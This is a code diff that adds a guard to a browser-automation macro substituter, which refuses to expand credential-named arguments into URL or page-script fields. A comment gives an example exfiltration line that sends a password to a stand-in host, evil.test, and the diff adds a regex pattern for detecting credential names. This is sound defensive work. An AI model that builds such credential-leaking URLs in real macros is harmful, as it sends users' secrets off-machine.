@@ -6,6 +6,7 @@
 from __future__ import annotations
 
 import copy
+import os
 import re
 from typing import Any
 
@@ -82,20 +83,64 @@ def strip_non_aria_noise(kind: str, kwargs: dict[str, Any]) -> dict[str, Any]:
     return cleaned
 
 
-def _substitute_value(value: Any, args: dict[str, Any]) -> Any:
+# Action fields that either leave the machine or execute code. A credential
+# expanded into one of these is exfiltration, not automation:
+# ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
+# the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
+CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression"})
+
+#: Arg names whose value is treated as a secret. Deliberately name-based: the
+#: substituter sees opaque caller-supplied args and has no other signal, and
+#: matching on the name is what lets ``{{order_id}}`` keep working in a URL
+#: (the common parameterized-navigation pattern) while ``{{password}}`` does
+#: not.
+_CREDENTIAL_ARG_RE = re.compile(
+    r"(?:^|_)(?:password|passwd|secret|token|otp|api_key|apikey|credential|auth)(?:$|_)",
+    re.IGNORECASE,
+)
+
+_CREDENTIAL_SINKS_OFF = frozenset({"0", "off", "false", "no", "never", "none", "disabled", "allow"})
+
+
+def credential_sinks_blocked() -> bool:
+    """Whether to refuse a credential-named arg in a navigation/code sink.
+
+    ON by default. Set ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`` to a falsey token
+    (or ``allow``) for a suite that intentionally puts a token in a URL --
+    an API-key query parameter is the legitimate case this would otherwise
+    break.
+    """
+    raw = os.environ.get("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "block").strip().lower()
+    return raw not in _CREDENTIAL_SINKS_OFF
+
+
+def is_credential_arg(name: str) -> bool:
+    return bool(_CREDENTIAL_ARG_RE.search(name))
+
+
+def _substitute_value(value: Any, args: dict[str, Any], *, unsafe_sink: bool = False) -> Any:
     if isinstance(value, str):
 
         def replacer(match: re.Match[str]) -> str:
             key = match.group(1)
             if key not in args:
                 raise KeyError(f"placeholder {{{{{key}}}}} has no matching arg; available: {list(args)}")
+            if unsafe_sink and is_credential_arg(key) and credential_sinks_blocked():
+                raise ValueError(
+                    f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
+                    "this would send the secret off-machine. Set "
+                    "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
+                )
             return str(args[key])
 
         return re.sub(r"\{\{([^}]+)\}\}", replacer, value)
     if isinstance(value, dict):
-        return {key: _substitute_value(item, args) for key, item in value.items()}
+        return {
+            key: _substitute_value(item, args, unsafe_sink=unsafe_sink or key in CREDENTIAL_UNSAFE_KEYS)
+            for key, item in value.items()
+        }
     if isinstance(value, list):
-        return [_substitute_value(item, args) for item in value]
+        return [_substitute_value(item, args, unsafe_sink=unsafe_sink) for item in value]
     return value
 
 
